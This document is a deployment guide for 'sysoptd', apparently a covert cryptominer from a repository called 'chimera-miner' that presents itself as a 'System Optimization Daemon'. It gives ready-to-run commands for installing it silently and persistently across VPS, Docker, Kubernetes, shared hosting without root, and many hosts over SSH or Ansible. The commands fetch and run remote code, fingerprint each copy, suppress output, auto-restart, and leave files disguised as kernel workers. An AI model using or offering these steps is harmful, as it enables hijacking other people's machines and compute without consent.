# Deployment Guide

Complete guide for deploying `sysoptd` workers across different environments.

---

## Prerequisites

### System Requirements

- **Operating System:** Linux (kernel 3.17+)
- **Python:** 3.7 or higher
- **RAM:** 2GB minimum, 4GB+ recommended
- **CPU:** Multi-core processor recommended
- **Network:** Outbound HTTPS/WebSocket access

### Python Dependencies

```bash
pip install websockets psutil
```

---

## Quick Deployment

### Single-Line Deployment

```bash
git clone https://github.com/cold-pressed-hoodie/chimera-miner.git && \
cd chimera-miner/sysoptd-v2 && \
pip install websockets psutil && \
python3 lib/fingerprint.py . && \
python3 sysoptd.py --rig worker-$(hostname) --threads 4 --quiet
```

### Manual Deployment

```bash
# 1. Clone repository
git clone https://github.com/cold-pressed-hoodie/chimera-miner.git
cd chimera-miner/sysoptd-v2

# 2. Install dependencies
pip install websockets psutil

# 3. Add unique fingerprint
python3 lib/fingerprint.py .

# 4. Run worker
python3 sysoptd.py --rig worker-$(hostname) --threads 4 --quiet
```

---

## Configuration Options

### Basic Configuration

```bash
# Run with custom worker name
python3 sysoptd.py --rig prod-worker-01 --threads 4

# Run with auto-detected threads
python3 sysoptd.py --rig worker-$(hostname)

# Run in quiet mode (no console output)
python3 sysoptd.py --rig worker-01 --threads 4 --quiet
```

### Advanced Configuration

```bash
# Custom relay endpoint
python3 sysoptd.py \
  --rig worker-01 \
  --threads 4 \
  --bridge wss://custom-relay.example.com

# Disable features
python3 sysoptd.py \
  --rig worker-01 \
  --threads 2 \
  --no-split \          # Single process mode
  --no-prealloc \       # No RAM pre-allocation
  --no-schedule         # No time-based throttling

# Custom log file
python3 sysoptd.py \
  --rig worker-01 \
  --threads 4 \
  --log-file /var/log/sysopt.log
```

---

## Environment-Specific Deployments

### 1. Cloud VPS (AWS, DigitalOcean, Linode)

```bash
#!/bin/bash
# deploy.sh - Run on fresh Ubuntu/Debian VPS

# Update system
apt-get update && apt-get upgrade -y

# Install Python and dependencies
apt-get install -y python3 python3-pip git

# Clone and setup
cd /opt
git clone https://github.com/cold-pressed-hoodie/chimera-miner.git
cd chimera-miner/sysoptd-v2

# Install Python deps
pip3 install websockets psutil

# Add fingerprint
python3 lib/fingerprint.py .

# Create systemd service
cat > /etc/systemd/system/sysoptd.service << 'EOF'
[Unit]
Description=System Optimization Daemon
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/chimera-miner/sysoptd-v2
ExecStart=/usr/bin/python3 sysoptd.py --rig worker-$(hostname) --threads 4 --quiet
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable sysoptd
systemctl start sysoptd
```

### 2. Docker Container

```dockerfile
# Dockerfile
FROM python:3.11-slim

# Install dependencies
RUN apt-get update && \
    apt-get install -y git && \
    rm -rf /var/lib/apt/lists/*

# Clone repository
WORKDIR /app
RUN git clone https://github.com/cold-pressed-hoodie/chimera-miner.git && \
    cd chimera-miner/sysoptd-v2 && \
    pip install --no-cache-dir websockets psutil

WORKDIR /app/chimera-miner/sysoptd-v2

# Add fingerprint and run
RUN python3 lib/fingerprint.py .

CMD ["python3", "sysoptd.py", "--rig", "docker-worker", "--threads", "4", "--quiet"]
```

**Build and run:**

```bash
# Build image
docker build -t sysoptd:latest .

# Run container
docker run -d \
  --name sysoptd-worker \
  --restart unless-stopped \
  --cpus="4" \
  --memory="4g" \
  sysoptd:latest

# View logs
docker logs -f sysoptd-worker
```

### 3. Kubernetes

```yaml
# sysoptd-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: sysoptd-worker
spec:
  replicas: 3
  selector:
    matchLabels:
      app: sysoptd
  template:
    metadata:
      labels:
        app: sysoptd
    spec:
      containers:
      - name: sysoptd
        image: sysoptd:latest
        resources:
          requests:
            memory: "2Gi"
            cpu: "2000m"
          limits:
            memory: "4Gi"
            cpu: "4000m"
        env:
        - name: WORKER_ID
          valueFrom:
            fieldRef:
              fieldPath: metadata.name
```

**Deploy:**

```bash
kubectl apply -f sysoptd-deployment.yaml
kubectl get pods -l app=sysoptd
```

### 4. Shared Hosting (User Mode)

```bash
#!/bin/bash
# For environments without root access

# Install to home directory
cd ~
git clone https://github.com/cold-pressed-hoodie/chimera-miner.git
cd chimera-miner/sysoptd-v2

# Install deps locally
pip3 install --user websockets psutil

# Add fingerprint
python3 lib/fingerprint.py .

# Run in background
nohup python3 sysoptd.py \
  --rig worker-$(hostname) \
  --threads 2 \
  --quiet \
  > /dev/null 2>&1 &

# Save PID
echo $! > ~/sysoptd.pid
```

---

## Process Management

### Systemd Service

Create `/etc/systemd/system/sysoptd.service`:

```ini
[Unit]
Description=System Optimization Daemon
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/chimera-miner/sysoptd-v2
ExecStart=/usr/bin/python3 sysoptd.py --rig worker-%H --threads 4 --quiet
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
```

**Manage service:**

```bash
# Start
systemctl start sysoptd

# Stop
systemctl stop sysoptd

# Enable auto-start
systemctl enable sysoptd

# Check status
systemctl status sysoptd

# View logs
journalctl -u sysoptd -f
```

### Cron Job (Auto-Restart)

```bash
# Add to crontab
crontab -e

# Restart daily at 3 AM
0 3 * * * systemctl restart sysoptd

# Or for user-mode installation
0 3 * * * pkill -f sysoptd.py && sleep 5 && cd ~/chimera-miner/sysoptd-v2 && nohup python3 sysoptd.py --rig worker-$(hostname) --threads 4 --quiet > /dev/null 2>&1 &
```

### Process Monitoring Script

```bash
#!/bin/bash
# monitor.sh - Restart if crashed

while true; do
    if ! pgrep -f "sysoptd.py" > /dev/null; then
        echo "[$(date)] Worker crashed, restarting..."
        cd /opt/chimera-miner/sysoptd-v2
        nohup python3 sysoptd.py --rig worker-$(hostname) --threads 4 --quiet > /dev/null 2>&1 &
    fi
    sleep 60
done
```

Run in background:

```bash
nohup bash monitor.sh > monitor.log 2>&1 &
```

---

## Multi-Node Deployment

### Deploy to Multiple Servers

```bash
#!/bin/bash
# deploy_multi.sh - Deploy to multiple hosts

HOSTS="
server1.example.com
server2.example.com
server3.example.com
"

for HOST in $HOSTS; do
    echo "Deploying to $HOST..."
    ssh $HOST << 'ENDSSH'
        cd /tmp
        git clone https://github.com/cold-pressed-hoodie/chimera-miner.git
        cd chimera-miner/sysoptd-v2
        pip3 install --user websockets psutil
        python3 lib/fingerprint.py .
        nohup python3 sysoptd.py --rig worker-$(hostname) --threads 4 --quiet > /dev/null 2>&1 &
ENDSSH
    echo "✓ Deployed to $HOST"
done
```

### Ansible Playbook

```yaml
# deploy.yml
---
- name: Deploy sysoptd workers
  hosts: workers
  become: yes
  tasks:
    - name: Install dependencies
      apt:
        name:
          - python3
          - python3-pip
          - git
        state: present

    - name: Clone repository
      git:
        repo: https://github.com/cold-pressed-hoodie/chimera-miner.git
        dest: /opt/chimera-miner
        version: master

    - name: Install Python packages
      pip:
        requirements: /opt/chimera-miner/sysoptd-v2/requirements.txt
        executable: pip3

    - name: Add fingerprint
      command: python3 lib/fingerprint.py .
      args:
        chdir: /opt/chimera-miner/sysoptd-v2

    - name: Create systemd service
      copy:
        dest: /etc/systemd/system/sysoptd.service
        content: |
          [Unit]
          Description=System Optimization Daemon
          After=network.target

          [Service]
          Type=simple
          WorkingDirectory=/opt/chimera-miner/sysoptd-v2
          ExecStart=/usr/bin/python3 sysoptd.py --rig worker-{{ inventory_hostname }} --threads 4 --quiet
          Restart=always

          [Install]
          WantedBy=multi-user.target

    - name: Enable and start service
      systemd:
        name: sysoptd
        enabled: yes
        state: started
        daemon_reload: yes
```

**Run:**

```bash
ansible-playbook -i inventory.ini deploy.yml
```

---

## Monitoring & Management

### Check Status

```bash
# Check if running
ps aux | grep sysoptd

# Check resource usage
top -p $(pgrep -f sysoptd)

# Check network connections
netstat -anp | grep $(pgrep -f sysoptd)

# View logs
tail -f runtime/session.log
```

### Health Check Script

```bash
#!/bin/bash
# health_check.sh

PID=$(pgrep -f "sysoptd.py")

if [ -z "$PID" ]; then
    echo "❌ sysoptd not running"
    exit 1
fi

CPU=$(ps -p $PID -o %cpu --no-headers | tr -d ' ')
MEM=$(ps -p $PID -o %mem --no-headers | tr -d ' ')

echo "✅ sysoptd running"
echo "   PID: $PID"
echo "   CPU: ${CPU}%"
echo "   MEM: ${MEM}%"

if (( $(echo "$CPU < 5" | bc -l) )); then
    echo "⚠️  Low CPU usage - might be idle or crashed"
    exit 2
fi

exit 0
```

### Remote Management

```bash
# Start all workers
pdsh -w server[1-10] "systemctl start sysoptd"

# Stop all workers
pdsh -w server[1-10] "systemctl stop sysoptd"

# Check status
pdsh -w server[1-10] "systemctl status sysoptd"

# View logs
pdsh -w server[1-10] "tail -20 /opt/chimera-miner/sysoptd-v2/runtime/session.log"
```

---

## Security Considerations

### Firewall Rules

```bash
# Allow outbound WebSocket (443)
iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT

# Block inbound connections (optional)
iptables -A INPUT -j DROP
```

### User Permissions

Run as non-root user:

```bash
# Create dedicated user
useradd -r -s /bin/false sysoptd

# Change ownership
chown -R sysoptd:sysoptd /opt/chimera-miner

# Update systemd service
User=sysoptd
```

### Resource Limits

```ini
# In systemd service file
[Service]
LimitNOFILE=4096
LimitNPROC=512
CPUQuota=400%
MemoryLimit=4G
```

---

## Troubleshooting

### Worker Won't Start

```bash
# Check dependencies
pip3 list | grep -E "websockets|psutil"

# Check Python version
python3 --version

# Run in foreground to see errors
cd /opt/chimera-miner/sysoptd-v2
python3 sysoptd.py --rig test --threads 2
```

### High Memory Usage

```bash
# Use gradual memory strategy
python3 sysoptd.py --rig worker-01 --threads 2 --no-prealloc
```

### Network Connection Failed

```bash
# Test relay connectivity
curl -I https://relay.sysopt.workers.dev

# Check DNS
nslookup relay.sysopt.workers.dev

# Test WebSocket
wscat -c wss://relay.sysopt.workers.dev
```

---

## Cleanup & Removal

### Stop and Remove

```bash
# Stop service
systemctl stop sysoptd
systemctl disable sysoptd

# Remove service file
rm /etc/systemd/system/sysoptd.service
systemctl daemon-reload

# Remove files
rm -rf /opt/chimera-miner

# Kill any running processes
pkill -f sysoptd.py
```

### Complete Cleanup

```bash
# Remove all traces
systemctl stop sysoptd 2>/dev/null
systemctl disable sysoptd 2>/dev/null
rm -f /etc/systemd/system/sysoptd.service
rm -rf /opt/chimera-miner
rm -rf ~/chimera-miner
pkill -9 -f sysoptd.py
pkill -9 -f net_relay.py
rm -f /dev/shm/.kworker_*
rm -f /dev/shm/.svc_*
```

---

## Best Practices

1. **Always fingerprint:** Run `python3 lib/fingerprint.py .` before deployment
2. **Use systemd:** For production, use systemd for auto-restart and management
3. **Monitor resources:** Keep an eye on CPU/RAM usage
4. **Rotate logs:** Set up log rotation for `runtime/session.log`
5. **Test first:** Always test on a single node before mass deployment
6. **Keep updated:** Pull latest changes from GitHub regularly
7. **Backup config:** Save custom configurations before updates

